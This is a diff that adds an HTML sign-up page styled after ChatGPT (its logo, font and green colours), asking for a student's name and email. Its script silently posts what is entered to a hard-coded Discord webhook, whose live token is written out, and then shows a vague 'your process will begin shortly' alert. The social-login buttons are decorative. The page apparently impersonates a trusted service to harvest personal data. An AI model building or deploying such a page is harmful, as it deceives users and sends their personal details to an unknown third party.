@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Create Own Account</title>
+<style>
+    body, html {
+        height: 100%;
+        margin: 0;
+        font-family: 'Söhne', -apple-system, BlinkMacSystemFont, Helvetica, sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: white; /* Changed background color to white */
+    }
+    .container {
+        /* Removed fixed width */
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        /* Removed box shadow */
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        align-items: center;
+    }
+    .input-container {
+        position: relative;
+        width: auto; /* Adjusted width to be automatic */
+        text-align: center; /* Centered text */
+    }
+    .input-container input[type="text"],
+    .input-container input[type="email"] {
+        padding: 10px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        width: 300px; /* Manually adjust the width as needed */
+        box-sizing: border-box;
+        margin-top: 10px;
+        height: 40px;
+        transition: border-color 0.2s; /* Added transition for smooth effect */
+    }
+    .input-container input[type="text"]:hover,
+    .input-container input[type="email"]:hover {
+        border-color: #10a37f; /* Changed border color on hover */
+    }
+    .input-container label {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-50%);
+        background: white;
+        padding: 0 5px;
+        color: #aaa;
+        font-size: 14px;
+        transition: all 0.2s;
+        pointer-events: none;
+        font-weight: normal;
+    }
+    .input-container input:focus + label,
+    .input-container input:not(:placeholder-shown) + label {
+        top: 5px;
+        left: 10px;
+        font-size: 12px;
+        color: #10a37f;
+        font-weight: normal;
+    }
+    button {
+        padding: 10px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        width: 300px; /* Manually adjust the width as needed */
+        box-sizing: border-box;
+        margin-top: 10px;
+        background-color: #10a37f;
+        color: white;
+        cursor: pointer;
+        height: 50px;
+    }
+    button:hover {
+        background-color: #0a8852;
+    }
+    .social-login {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        background: white;
+        color: black;
+        cursor: pointer;
+        height: 40px;
+        transition: background-color 0.2s;
+    }
+    .social-login:hover {
+        background-color: #e0e0e0;
+    }
+    .social-login img {
+        width: 20px;
+        margin-right: 10px;
+    }
+    .divider {
+        text-align: center;
+        width: 100%;
+        border-bottom: 1px solid #ccc;
+        line-height: 0.1em;
+        margin: 20px 0 20px;
+    }
+    .divider::after {
+        content: 'OR';
+        background: white;
+        padding: 0 10px;
+        font-size: 13px; 
+    }
+    footer {
+        text-align: center;
+        font-size: 12px;
+        color: #777;
+        padding: 12px 0;
+        width: 100%;
+        position: absolute;
+        bottom: 10px;
+    }
+    footer a {
+        color: #10a37f;
+        text-decoration: none;
+    }
+    footer a:hover {
+        text-decoration: underline;
+    }
+    h1 {
+        text-align: center;
+    }
+    p {
+        text-align: center;
+        font-size: 14px;
+    }
+    p a {
+        font-size: 14px;
+        color: #10a37f;
+    }
+    p a:hover {
+        text-decoration: underline;
+    }
+    /* New styles for the image */
+    .logo {
+        width: 100px;
+        height: auto; /* Adjust the width as needed */
+        margin-bottom: 20px; /* Add some space below the image */
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/13/ChatGPT-Logo.png" alt="Logo" class="logo" width="100px"> <!-- Add your image here -->
+        <h1>Create Own Account</h1>
+        <div class="input-aligner">
+            <div class="input-container">
+                <input type="text" placeholder=" " id="student-name">
+                <label for="student-name">Student Name</label> 
+            </div>
+            <div class="input-container">
+                <input type="email" placeholder=" " id="student-email">
+                <label for="student-email">Student Email Address</label>
+            </div>
+        </div>
+        <button type="button" onclick="sendToDiscord()">Continue</button>
+        <p>Don't have an account? <a href="#">Log in</a></p>
+        <div class="divider"></div>
+        <button class="social-login google"><img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="Google">Continue with Google</button>
+        <button class="social-login microsoft"><img src="https://static-00.iconduck.com/assets.00/microsoft-icon-2048x2048-xtoxrveo.png" alt="Microsoft">Continue with Microsoft Account</button>
+        <button class="social-login apple"><img src="https://www.freepnglogos.com/uploads/apple-logo-png/apple-logo-png-dallas-shootings-don-add-are-speech-zones-used-4.png" alt="Apple">Continue with Apple</button>
+    </div>  
+    <footer>
+        <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a>
+    </footer>
+
+    <script>
+        function sendToDiscord() {
+            const studentName = document.getElementById('student-name').value;
+            const studentEmail = document.getElementById('student-email').value;
+            
+            if (!isValidEmail(studentEmail)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+            
+            // Construct the message
+            const message = `New Student Registration:\nName: ${studentName}\nEmail: ${studentEmail}`;
+
+
+            // Discord webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1239160408548446269/y091SCRKe03J6DgCrVNHZb4coTxF7sr5OlaV3oJm144d7tKALX-Pf9H8134UUPL8CVKw';
+
+            // Make a POST request to Discord webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: message }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to information');
+                }
+                alert('Take a break, your process will begin shortly');
+            })
+        }
+
+        // Function to validate email format
+        function isValidEmail(email) {
+            return /\S+@\S+\.\S+/.test(email);
+        }
+    </script>
+</body>
+</html>
